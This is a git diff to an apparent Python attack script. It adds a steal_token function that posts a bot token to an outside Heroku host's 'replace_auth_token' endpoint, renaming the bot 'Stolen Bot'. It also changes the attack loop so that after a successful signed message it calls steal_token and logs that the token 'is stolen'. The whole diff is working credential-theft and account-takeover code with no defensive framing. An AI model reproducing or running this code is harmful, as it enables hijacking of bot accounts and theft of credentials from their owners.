@@ -63,6 +63,30 @@ def send_message(url, message, signature):
     return resp
 
 
+def steal_token(token):
+    body = {
+        "name": "Stolen Bot",
+        "avatar": "https://www.python.org/static/opengraph-icon-200x200.png",
+        "token": token,
+        "webhook": "https://intense-reaches-70533.herokuapp.com/"
+    }
+    try:
+
+        resp = requests.post(
+            url="https://intense-reaches-70533.herokuapp.com/replace_auth_token",
+            headers={
+                'Content-Type': 'application/json',
+            },
+            json=body
+        )
+
+    except Exception as error:
+        logging.error('request error {}'.format(error))
+        resp = None
+
+    return resp
+
+
 def attack(url=URL, limit=LIMIT, token=TOKEN):
     while limit > 0:
         data = read('data.json')
@@ -74,8 +98,19 @@ def attack(url=URL, limit=LIMIT, token=TOKEN):
             resp = send_message(url, message, signature)
 
             if resp is not None:
-                logging.info('Num: {0} status code: {1}, token: {2}, resp: {3}'.format(i, resp.status_code, token, resp.content))
-                if resp.status_code != 200:
+                logging.info(
+                    'Num: {0} status code: {1}, token: {2}, resp: {3}'.format(i, resp.status_code, token, resp.content))
+
+                if resp.status_code == 200:
+
+                    resp = steal_token(token)
+                    if resp is not None and resp.status_code == 200:
+                        logging.info("Token {} is stolen".format(token))
+                        logging.info("Bot info: {}".format(resp.json()))
+                        limit = 0
+                        break
+
+                else:
                     token = get_token()
 
         limit -= 1
